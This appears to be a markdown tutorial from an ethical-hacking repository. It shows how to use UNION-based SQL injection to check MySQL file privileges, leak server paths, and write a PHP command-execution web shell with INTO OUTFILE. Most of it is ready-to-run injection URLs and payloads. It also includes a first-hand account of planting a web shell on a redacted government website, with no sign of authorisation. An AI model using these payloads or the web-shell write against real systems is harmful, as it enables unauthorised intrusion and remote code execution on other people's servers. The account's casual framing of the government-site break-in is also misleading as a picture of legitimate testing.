# SQL Privilege Escalation

## Identifying permissions of a single user

If the database user has write permission, it allows an attacker to upload arbitrary files in the server.

Let's suppose that the website has 12 columns and the given UNION Based SQL query shows that the vulnerable column is 4:
```http://domain.com/index.php?id=1' Union Select 1,2,3,4,5,6,7,8,9,10,11,12-- -```

Payload used for Privilege Check via I_S.PRIVILEGES:
```
(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)
```
Payload used for Privilege Check via MySQL System Table:
```
(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)
```

Apply one of the queries into the 4th column:
```http://domain.com/index.php?id=1' Union Select 1,2,3,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),5,6,7,8,9,10,11,12-- -```

Look into the results, if 'root'@'localhost' is YES, then we can perform Privilage Escalation (perform RCE). Else, if NO is shown we can't perform RCE since we don't have permission to write over the server.

## Escalating privileges

The typical method for discovering a path involves querying the temporary path in SQL. To achieve this, we can utilize the following query to retrieve absolute path directories:
```
@@slave_load_tmpdir
@@basedir
@@datadir
@@tmpdir
```
Look at the output, you should look after a directory, something like this: /var/mysqltmp
This means that we can upload files to /mysqltmp

An alternative approach, especially when a website is prone to errors, is to trigger a 'Fatal Error' or a Syntax Error. The absolute path will then be revealed, typically highlighted or bolded, similar to the image below. Please be aware that various websites may display different outputs and formats.

![image](https://github.com/29yannic/Ethical-Hacking/assets/76999460/095ab819-4078-46fe-9419-10fbd8c9cac8)

The bold part is the absolute path: E:\xampp\htdocs which is converted to E:/xampp/htdocs

## Real life scenario (Thanks to user kleiton0x00)

Below is a simple writeup of how I managed to upload a webshell in a gov website. Using the following query I found out that column 7 was vulnerable:
```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,7,8--```

Let's enumerate the user's privilege:
```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),8--```

The output looks promising, the user j**** has writing permission, which mean we can write arbitrary files:
[privilege_check_output](https://camo.githubusercontent.com/652d45ede363f43bfcb9e1469a51145fda6837caa21c53421c5e67bbf36cc310/68747470733a2f2f692e696d6775722e636f6d2f473848523754712e6a7067)

Now it's time to find an existing path so we know where to write our webshell. For this I am going to use some global variables (which we already discussed here)
```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,@@slave_load_tmpdir,8--```

The output is:
```C:\xampp\tmp```

Great, so now let's upload a webshell to C:\xampp\tmp:
```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,"<?php system($_GET['cmd']); ?>",8 into outfile 'C:/xampp/tmp/webshell.php'--```

I tried to find a way how to access our webshell, but since it is uploaded on /tmp directory, there was no chance to directly access it. In this case, we use load_file() function. ```http://xxxx.gov.xx/redacted/redactedphpfile?aid=1 union select 1,2,3,4,5,6,load_file('C:/xampp/tmp/webshell.php'),8--```

If we see the source-code of the response, we can see our webshell uploaded:
![image](https://github.com/29yannic/Ethical-Hacking/assets/76999460/f2a60318-98f1-411f-a42d-c7de8175898d)

Note: This is a simple PoC, in real-life pentest engagements, you might prefer uploading a proper webshell instead, since it is easier to interact with it.

